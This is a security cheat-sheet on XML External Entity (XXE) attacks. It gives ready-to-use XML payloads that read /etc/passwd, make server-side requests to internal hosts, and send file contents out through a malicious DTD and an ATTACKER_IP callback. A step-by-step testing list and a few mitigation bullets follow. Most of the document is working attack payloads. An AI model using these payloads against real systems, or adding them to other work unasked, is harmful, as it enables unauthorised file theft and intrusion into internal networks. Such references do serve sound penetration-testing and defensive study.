# XML External Entity (XXE)

Exploit XML parsers that process external entity declarations, allowing file reading, SSRF, and potentially RCE.

## How It Works

XML allows defining external entities that reference external resources. If the parser processes them, an attacker can read files or make server-side requests.

## Basic XXE -- File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

The parser replaces `&xxe;` with the contents of `/etc/passwd`.

## SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<root>
  <data>&xxe;</data>
</root>
```

Makes the server request internal resources.

## Blind XXE

No output in response -- exfiltrate data out-of-band.

### Out-of-Band via HTTP

Malicious DTD hosted on attacker (`evil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
%exfil;
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
  %xxe;
]>
<root>&send;</root>
```

## Where to Look

- Any endpoint accepting XML input
- SOAP APIs
- File upload (SVG, DOCX, XLSX are XML-based)
- RSS/Atom feeds
- SAML authentication

## Testing

1. Submit a basic XML entity and check if it's processed
2. Try reading a known file (`/etc/hostname`, `C:\windows\win.ini`)
3. If no output, try blind XXE with out-of-band exfiltration

## Mitigations

- Disable external entity processing in the XML parser
- Use JSON instead of XML where possible
- Input validation and sanitization
- WAF rules for XXE patterns
